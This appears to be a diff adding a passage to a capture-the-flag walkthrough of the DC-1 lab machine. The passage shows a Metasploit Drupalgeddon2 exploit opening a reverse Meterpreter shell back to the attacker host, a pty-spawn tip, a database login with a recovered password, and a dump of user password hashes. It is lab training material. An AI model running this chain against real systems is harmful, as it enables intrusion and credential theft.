@@ -834,3 +834,235 @@ select * from users;
 
 
 ```
+
+>>Note - **python -c ‘import pty; pty.spawn(“/bin/bash”)’** use this command on meterpreter session to gain bash access
+>
+
+```
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.0.2.1
+RHOSTS => 10.0.2.1
+msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.0.2.10
+RHOSTS => 10.0.2.10
+msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
+[*] Started reverse TCP handler on 10.0.2.6:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The service is running, but could not be validated.
+[*] Sending stage (41224 bytes) to 10.0.2.10
+[*] Meterpreter session 1 opened (10.0.2.6:4444 -> 10.0.2.10:45763) at 2025-11-24 14:16:00 -0500
+
+meterpreter > python -c ‘import pty; pty.spawn(“/bin/bash”)’
+[-] Unknown command: python. Run the help command for more details.
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
+100644/rw-r--r--  24769076401799  fil   188498731153-02-08 21:33:43 -0500  .htaccess
+100644/rw-r--r--  6360846566857   fil   188498731153-02-08 21:33:43 -0500  COPYRIGHT.txt
+100644/rw-r--r--  6231997547947   fil   188498731153-02-08 21:33:43 -0500  INSTALL.mysql.txt
+100644/rw-r--r--  8048768714578   fil   188498731153-02-08 21:33:43 -0500  INSTALL.pgsql.txt
+100644/rw-r--r--  5574867551506   fil   188498731153-02-08 21:33:43 -0500  INSTALL.sqlite.txt
+100644/rw-r--r--  76712410891717  fil   188498731153-02-08 21:33:43 -0500  INSTALL.txt
+100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 10:02:15 -0500  LICENSE.txt
+100644/rw-r--r--  35180077129727  fil   188498731153-02-08 21:33:43 -0500  MAINTAINERS.txt
+100644/rw-r--r--  23089744188672  fil   188498731153-02-08 21:33:43 -0500  README.txt
+100644/rw-r--r--  41412074677674  fil   188498731153-02-08 21:33:43 -0500  UPGRADE.txt
+100644/rw-r--r--  28363964029388  fil   188498731153-02-08 21:33:43 -0500  authorize.php
+100644/rw-r--r--  3092376453840   fil   188498731153-02-08 21:33:43 -0500  cron.php
+100644/rw-r--r--  223338299444    fil   211037522224-07-25 00:21:02 -0400  flag1.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  includes
+100644/rw-r--r--  2272037700113   fil   188498731153-02-08 21:33:43 -0500  index.php
+100644/rw-r--r--  3019362009791   fil   188498731153-02-08 21:33:43 -0500  install.php
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  misc
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  modules
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  profiles
+100644/rw-r--r--  6704443950617   fil   188498731153-02-08 21:33:43 -0500  robots.txt
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  scripts
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  sites
+040755/rwxr-xr-x  17592186048512  dir   188498731153-02-08 21:33:43 -0500  themes
+100644/rw-r--r--  85645942869477  fil   188498731153-02-08 21:33:43 -0500  update.php
+100644/rw-r--r--  9354438772866   fil   188498731153-02-08 21:33:43 -0500  web.config
+100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php
+
+meterpreter > cd scrtips
+[-] stdapi_fs_chdir: Operation failed: 1
+meterpreter > cd scripts
+meterpreter > ls
+Listing: /var/www/scripts
+=========================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  2443836391993   fil   188498731153-02-08 21:33:43 -0500  code-clean.sh
+100644/rw-r--r--  283467841602    fil   188498731153-02-08 21:33:43 -0500  cron-curl.sh
+100644/rw-r--r--  335007449166    fil   188498731153-02-08 21:33:43 -0500  cron-lynx.sh
+100755/rwxr-xr-x  18313740554408  fil   188498731153-02-08 21:33:43 -0500  drupal.sh
+100644/rw-r--r--  12691628362635  fil   188498731153-02-08 21:33:43 -0500  dump-database-d6.sh
+100644/rw-r--r--  11050950855181  fil   188498731153-02-08 21:33:43 -0500  dump-database-d7.sh
+100644/rw-r--r--  29265907161758  fil   188498731153-02-08 21:33:43 -0500  generate-d6-content.sh
+100644/rw-r--r--  46342697134630  fil   188498731153-02-08 21:33:43 -0500  generate-d7-content.sh
+100755/rwxr-xr-x  10149007722811  fil   188498731153-02-08 21:33:43 -0500  password-hash.sh
+100755/rwxr-xr-x  88145613836331  fil   188498731153-02-08 21:33:43 -0500  run-tests.sh
+100644/rw-r--r--  794568949945    fil   188498731153-02-08 21:33:43 -0500  test.script
+
+meterpreter > cd ..
+meterpreter > cd sites
+meterpreter > cd default
+meterpreter > ls
+Listing: /var/www/sites/default
+===============================
+
+Mode              Size            Type  Last modified                      Name
+----              ----            ----  -------------                      ----
+100644/rw-r--r--  99651831224994  fil   188498731153-02-08 21:33:43 -0500  default.settings.php
+040775/rwxrwxr-x  17592186048512  dir   211037438521-10-10 04:26:47 -0400  files
+100444/r--r--r--  68672232111733  fil   211037744751-06-28 21:04:17 -0400  settings.php
+
+meterpreter > python -c ‘import pty; pty.spawn(“/bin/bash”)’
+[-] Unknown command: python. Run the help command for more details.
+meterpreter > python3 -c import pty; pty.spawn(/bin/bash)
+[-] Unknown command: python3. Run the help command for more details.
+meterpreter > shell
+Process 3324 created.
+Channel 0 created.
+python -c ‘import pty; pty.spawn(“/bin/bash”)’
+/bin/sh: 1: Syntax error: word unexpected (expecting ")")
+meterpreter > python3 -c import pty; pty.spawn(/bin/bash)
+[-] Unknown command: python3. Run the help command for more details.
+meterpreter > shell
+Process 3326 created.
+Channel 1 created.
+python -c ‘import pty; pty.spawn(“/bin/bash”)’
+/bin/sh: 1: Syntax error: word unexpected (expecting ")")
+meterpreter > shell 
+Process 3328 created.
+Channel 2 created.
+python -c 'import pty; pty.spawn("/bin/bash");
+'
+www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -p drupaldb
+mysql -u dbuser -p drupaldb
+Enter password: R0ck3t
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 53
+Server version: 5.5.60-0+deb7u1 (Debian)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show tables;
+show tables;
++-----------------------------+
+| Tables_in_drupaldb          |
++-----------------------------+
+| actions                     |
+| authmap                     |
+| batch                       |
+| block                       |
+| block_custom                |
+| block_node_type             |
+| block_role                  |
+| blocked_ips                 |
+| cache                       |
+| cache_block                 |
+| cache_bootstrap             |
+| cache_field                 |
+| cache_filter                |
+| cache_form                  |
+| cache_image                 |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| cache_update                |
+| cache_views                 |
+| cache_views_data            |
+| comment                     |
+| ctools_css_cache            |
+| ctools_object_cache         |
+| date_format_locale          |
+| date_format_type            |
+| date_formats                |
+| field_config                |
+| field_config_instance       |
+| field_data_body             |
+| field_data_comment_body     |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_comment_body |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_usage                  |
+| filter                      |
+| filter_format               |
+| flood                       |
+| history                     |
+| image_effects               |
+| image_styles                |
+| menu_custom                 |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_comment_statistics     |
+| node_revision               |
+| node_type                   |
+| queue                       |
+| rdf_mapping                 |
+| registry                    |
+| registry_file               |
+| role                        |
+| role_permission             |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| shortcut_set                |
+| shortcut_set_users          |
+| system                      |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| taxonomy_vocabulary         |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| views_display               |
+| views_view                  |
+| watchdog                    |
++-----------------------------+
+80 rows in set (0.00 sec)
+
+mysql> SELECT * FROM Users;
+SELECT * FROM Users;
+ERROR 1146 (42S02): Table 'drupaldb.Users' doesn't exist
+mysql> SELECT * FROM users;
+SELECT * FROM users;
++-----+---------------+---------------------------------------------------------+---------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------------------------+------+
+| uid | name          | pass                                                    | mail                      | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init                      | data |
++-----+---------------+---------------------------------------------------------+---------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------------------------+------+
+|   0 |               |                                                         |                           |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                           | NULL |
+|   1 | admin         | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com         |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com         | b:0; |
+|   2 | Fred          | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org          |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org          | b:0; |
+|   3 | shibushivansh | $S$Dae/z1RCmYpfE9vQZXheUBZHv1aXFZexd9QpkqOHwT7WP/L8Qv8P | seth.shivansh67@gmail.omc |       |           | filtered_html    | 1763719126 |          0 |          0 |      0 | Australia/Melbourne |          |       0 | seth.shivansh67@gmail.omc | NULL |
++-----+---------------+---------------------------------------------------------+---------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+---------------------------+------+
+4 rows in set (0.00 sec)
+
+```
